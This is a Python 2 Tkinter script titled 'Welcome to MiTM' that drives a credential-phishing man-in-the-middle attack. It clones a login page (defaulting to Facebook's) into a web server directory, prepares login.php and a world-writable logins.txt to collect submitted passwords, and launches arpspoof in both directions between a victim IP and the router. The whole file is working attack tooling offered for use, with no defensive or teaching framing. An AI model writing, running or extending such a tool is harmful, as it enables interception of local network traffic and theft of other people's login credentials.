#!/usr/bin/python

import re
import Tkinter as tk
import os
import subprocess

root = tk.Tk()

root.title("Welcome to MiTM")

scrapperLabel = tk.Label(root, text="--------- Scrapper Setup ---------")
scrapperUrlLabel = tk.Label(root, text="Enter Scrapper URL")
scrapperOutLabel = tk.Label(root, text="Enter Server Directory")

spoofLabel = tk.Label(root, text="--------- ArpSpoof Setup ---------")
spoofTargetLabel = tk.Label(root, text="Enter ArpSpoof Target's IP Address")
spoofHostLabel = tk.Label(root, text="Enter ArpSpoof Routers's IP Address")

tk.Label(root, text="").grid(column=0, row=0, columnspan=2, ipadx=2, ipady=2, padx=2, pady=2)

scrapperLabel.grid(column=0, row=2, sticky=tk.N + tk.E + tk.W + tk.S, columnspan=2, ipadx=2, ipady=2, padx=2, pady=2)
scrapperUrlLabel.grid(column=0, row=4, sticky=tk.W, ipadx=2, ipady=2, padx=2, pady=2)
scrapperOutLabel.grid(column=0, row=6, sticky=tk.W, ipadx=2, ipady=2, padx=2, pady=2)

tk.Label(root, text="").grid(column=0, row=8, columnspan=2, ipadx=2, ipady=2, padx=2, pady=2)

spoofLabel.grid(column=0, row=10, sticky=tk.N + tk.E + tk.W + tk.S, columnspan=2, ipadx=2, ipady=2, padx=2, pady=2)
spoofTargetLabel.grid(column=0, row=12, sticky=tk.W, ipadx=2, ipady=2, padx=2, pady=2)
spoofHostLabel.grid(column=0, row=14, sticky=tk.W, ipadx=2, ipady=2, padx=2, pady=2)

tk.Label(root, text="").grid(column=0, row=16, columnspan=2, ipadx=2, ipady=2, padx=2, pady=2)

scrapperUrlVar = tk.StringVar()
scrapperOutVar = tk.StringVar()
spoofTargetVar = tk.StringVar()
spoofHostVar = tk.StringVar()

scrapperUrlVar.set("http://facebook.com/login")
scrapperOutVar.set("/var/www/")
spoofTargetVar.set("192.168.1.1")
spoofHostVar.set("192.168.1.0")

scrapperUrlEntry = tk.Entry(root, textvariable=scrapperUrlVar)
scrapperOutEntry = tk.Entry(root, textvariable=scrapperOutVar)
spoofTargetEntry = tk.Entry(root, textvariable=spoofTargetVar)
spoofHostEntry = tk.Entry(root, textvariable=spoofHostVar)

scrapperUrlEntry.grid(column=1, row=4, sticky=tk.E, ipadx=2, ipady=2, padx=2, pady=2)
scrapperOutEntry.grid(column=1, row=6, sticky=tk.E, ipadx=2, ipady=2, padx=2, pady=2)
spoofTargetEntry.grid(column=1, row=12, sticky=tk.E, ipadx=2, ipady=2, padx=2, pady=2)
spoofHostEntry.grid(column=1, row=14, sticky=tk.E, ipadx=2, ipady=2, padx=2, pady=2)


def main():
    runButton = tk.Button(root, text="Run", command=validate_inputs)
    runButton.grid(column=0, row=18, columnspan=2, sticky=tk.N + tk.E + tk.W + tk.S, ipadx=2, ipady=2, padx=2, pady=2)

    root.mainloop()


errorLabel1 = tk.Label(root, text="Input Error. Incorrect URL Format")
errorLabel2 = tk.Label(root, text="Input Error. Specify correct Path.")
errorLabel3 = tk.Label(root, text="Input Error. Not an IPV4 Address.")
errorLabel4 = tk.Label(root, text="Input Error. Not an IPV4 Address.")


def validate_inputs():
    regexURL = r'^(https?):\/\/(([a-z0-9$_\.\+!\*\'\(\),;\?&=-]|%[0-9a-f]{2})+(:([a-z0-9$_\.\+!\*\'\(\),;\?&=-]|%[0-9a-f]{2})+)?@)?(?#)((([a-z0-9]\.|[a-z0-9][a-z0-9-]*[a-z0-9]\.)*[a-z][a-z0-9-]*[a-z0-9]|((\d|[1-9]\d|1\d{2}|2[0-4][0-9]|25[0-5])\.){3}(\d|[1-9]\d|1\d{2}|2[0-4][0-9]|25[0-5]))(:\d+)?)(((\/+([a-z0-9$_\.\+!\*\'\(\),;:@&=-]|%[0-9a-f]{2})*)*(\?([a-z0-9$_\.\+!\*\'\(\),;:@&=-]|%[0-9a-f]{2})*)?)?)?(#([a-z0-9$_\.\+!\*\'\(\),;:@&=-]|%[0-9a-f]{2})*)?$'
    regexIPV4 = r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.|$)){4}$'

    matchScrapperUrl = re.match(regexURL, scrapperUrlEntry.get().strip(), re.M | re.I | re.U)
    matchScrapperOut = os.path.exists(os.path.abspath(scrapperOutEntry.get().strip()) + "/")
    matchSpoofTarget = re.match(regexIPV4, spoofTargetEntry.get().strip(), re.M | re.I)
    matchSpoofHost = re.match(regexIPV4, spoofHostEntry.get().strip(), re.M | re.I)

    if matchScrapperUrl:
        errorLabel1.grid_remove()
    else:
        errorLabel1.grid(column=0, row=5, columnspan=2, ipadx=2, ipady=2, padx=2, pady=2)
    if matchScrapperOut:
        errorLabel2.grid_remove()
    else:
        errorLabel2.grid(column=0, row=7, columnspan=2, ipadx=2, ipady=2, padx=2, pady=2)
    if matchSpoofTarget:
        errorLabel3.grid_remove()
    else:
        errorLabel3.grid(column=0, row=13, columnspan=2, ipadx=2, ipady=2, padx=2, pady=2)
    if matchSpoofHost:
        errorLabel4.grid_remove()
    else:
        errorLabel4.grid(column=0, row=15, columnspan=2, ipadx=2, ipady=2, padx=2, pady=2)

    root.update_idletasks()

    if matchScrapperUrl and matchScrapperOut and matchSpoofTarget and matchSpoofHost:
        accept_inputs()
    else:
        deny_inputs()


def deny_inputs():
    print "Bad Inputs. Please Fix."


def accept_inputs():
    scrapperUrl = scrapperUrlEntry.get().strip()
    scrapperOut = os.path.abspath(scrapperOutEntry.get().strip()) + os.sep
    spoofTarget = spoofTargetEntry.get().strip()
    spoofHost = spoofHostEntry.get().strip()

    cmd = "python ./htmlscraper.py " + scrapperUrl + " " + scrapperOut
    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    print cmd
    print p.wait()
    print p.communicate(), "\n"

    if os.path.isfile(scrapperOut + 'login.php') and os.path.isfile(scrapperOut + 'index.html'):
        if not os.path.exists(scrapperOut + 'logins.txt'):
            open(scrapperOut + 'logins.txt', 'w').close()

        os.chmod(scrapperOut + "index.html", int("777", 8))
        os.chmod(scrapperOut + "login.php", int("777", 8))
        os.chmod(scrapperOut + "logins.txt", int("777", 8))

        cmd = "python ./route.py"
        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        print cmd
        route_status = p.wait()
        print route_status
        print p.communicate(), "\n"

        if route_status == 0:
            cmd = "/usr/sbin/arpspoof -t " + spoofHost + " " + spoofTarget + " &"
            subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            print cmd

            cmd = "/usr/sbin/arpspoof -t " + spoofTarget + " " + spoofHost + " &"
            subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            print cmd


if __name__ == '__main__':
    main()
